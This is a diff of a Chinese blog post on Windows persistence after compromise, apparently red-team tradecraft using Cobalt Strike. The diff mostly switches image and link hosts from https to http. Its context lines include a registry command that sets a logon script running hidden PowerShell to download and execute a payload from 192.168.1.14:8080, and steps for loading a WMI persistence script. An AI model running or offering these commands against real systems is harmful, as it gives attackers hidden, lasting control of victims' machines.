@@ -36,17 +36,17 @@ shell reg add hklm\software\microsoft\windows\currentversion\run /v "shell" /t R
 
 `dir /s /b powershell.exe`
 
-![](https://cdn.laohuan.art/2021-04-24_16-26.png)
+![](http://qn.laohuan.xin/2021-04-24_16-26.png)
 
 查询刚刚添加的键值
 
 ` shell reg query hklm\software\microsoft\windows\currentversion\run`
 
-![](https://cdn.laohuan.art/2021-04-24_16-31.png)
+![](http://qn.laohuan.xin/2021-04-24_16-31.png)
 
 重启之后可上线
 
-![](https://cdn.laohuan.art/2021-04-24_16-37.png)
+![](http://qn.laohuan.xin/2021-04-24_16-37.png)
 
 ##### 计划任务
 
@@ -64,17 +64,17 @@ shell reg add hklm\software\microsoft\windows\currentversion\run /v "shell" /t R
 2. onlogon 用户登陆
 3. onidle  /i 1 系统空闲,**/i**参数指定系统必须持续空闲1分钟才启动计划任务
 
-![](https://cdn.laohuan.art/2021-04-24_17-20.png)
+![](http://qn.laohuan.xin/2021-04-24_17-20.png)
 
 查看创建的计划任务
 
 ` shell schtasks /query /fo list /tn update /v `
 
-![](https://cdn.laohuan.art/2021-04-24_20-10.png)
+![](http://qn.laohuan.xin/2021-04-24_20-10.png)
 
 重启上线
 
-![](https://cdn.laohuan.art/2021-04-24_20-03.png)
+![](http://qn.laohuan.xin/2021-04-24_20-03.png)
 
 ##### 启动项
 
@@ -126,7 +126,7 @@ cs上可直接生成以服务运行的可执行程序，这里继续以无文件
 shell reg add  HKCU\Environment  /v UserInitMprLogonScript /t REG_SZ  /d "c:\windows\system32\windowspowershell\v1.0\powershell.exe -nop -w hidden -c \"IEX((new-object net.webclient).downloadstring('http://192.168.1.14:8080/a'))\"" /f
 ```
 
-![](https://cdn.laohuan.art/2021-04-28_21-03.png)
+![](http://qn.laohuan.xin/2021-04-28_21-03.png)
 
 ##### WMI
 
@@ -134,11 +134,11 @@ windows可通过WMI使用命令行或批处理命令来管理系统，相当于�
 
 网上已有利用WMI做权限维持的脚本
 
-[**WMI-Persistence.ps1**](https://github.com/n0pe-sled/WMI-Persistence/blob/master/WMI-Persistence.ps1)
+[**WMI-Persistence.ps1**](http://github.com/n0pe-sled/WMI-Persistence/blob/master/WMI-Persistence.ps1)
 
 修改payload
 
-![](https://cdn.laohuan.art/2021-04-28_21-27.png)
+![](http://qn.laohuan.xin/2021-04-28_21-27.png)
 
 1.`powershell-import /home/kali/software/WMI-Persistence.ps1 `
 
@@ -150,9 +150,9 @@ windows可通过WMI使用命令行或批处理命令来管理系统，相当于�
 
 4.powershell  Remove-Persistence
 
-![](https://cdn.laohuan.art/2021-04-28_21-38.png)
+![](http://qn.laohuan.xin/2021-04-28_21-38.png)
 
-![](https://cdn.laohuan.art/2021-04-28_21-39.png)
+![](http://qn.laohuan.xin/2021-04-28_21-39.png)
 
 #### 后话
 
@@ -160,6 +160,6 @@ windows可通过WMI使用命令行或批处理命令来管理系统，相当于�
 
 #### 参考链接
 
-* [https://www.freebuf.com/articles/system/229209.html](https://www.freebuf.com/articles/system/229209.html)
-* [https://xz.aliyun.com/t/8095](https://xz.aliyun.com/t/8095)
+* [http://www.freebuf.com/articles/system/229209.html](http://www.freebuf.com/articles/system/229209.html)
+* [http://xz.aliyun.com/t/8095](http://xz.aliyun.com/t/8095)
 
